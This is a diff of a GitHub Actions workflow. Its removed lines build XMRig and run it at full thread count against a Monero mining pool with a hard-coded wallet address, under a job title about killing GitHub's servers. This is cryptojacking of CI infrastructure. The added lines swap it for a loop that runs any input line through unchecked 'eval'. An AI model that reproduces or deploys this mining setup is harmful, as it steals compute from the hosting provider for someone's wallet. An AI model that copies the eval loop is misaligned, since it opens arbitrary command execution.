@@ -1,26 +1,20 @@
-name: Fucking Kill GH Servers
+name: Run custom shell commands
 
 on:
   workflow_dispatch:
 
 jobs:
-  run-xmrig:
+  run-commands:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v2
-      
-      - name: Install dependencies
-        run: sudo apt-get update && sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
-      
-      - name: Build XMRig
+      - name: Run custom shell commands
         run: |
-          git clone https://github.com/xmrig/xmrig.git
-          mkdir xmrig/build && cd xmrig/build
-          cmake ..
-          make -j$(nproc)
-      
-      - name: Run XMRig
-        run: |
-          cd xmrig/build
-          ./xmrig -o pool.supportxmr.com:3333 -u 42B5H8ffGYvSTxnXjSWd8Yh1MZjAi2F4dNUcfdFWRMpSKYo7Bz9LZ5UXRPyGPkYp3KFSqsH8QBqgUMAbun584SX3RT5acSR -p x -k --threads=$(nproc)
+          echo "Enter your shell commands below (type 'exit' to end input):"
+          while true; do
+            read commands
+            if [ "$commands" = "exit" ]; then
+              break
+            else
+              eval $commands
+            fi
+          done
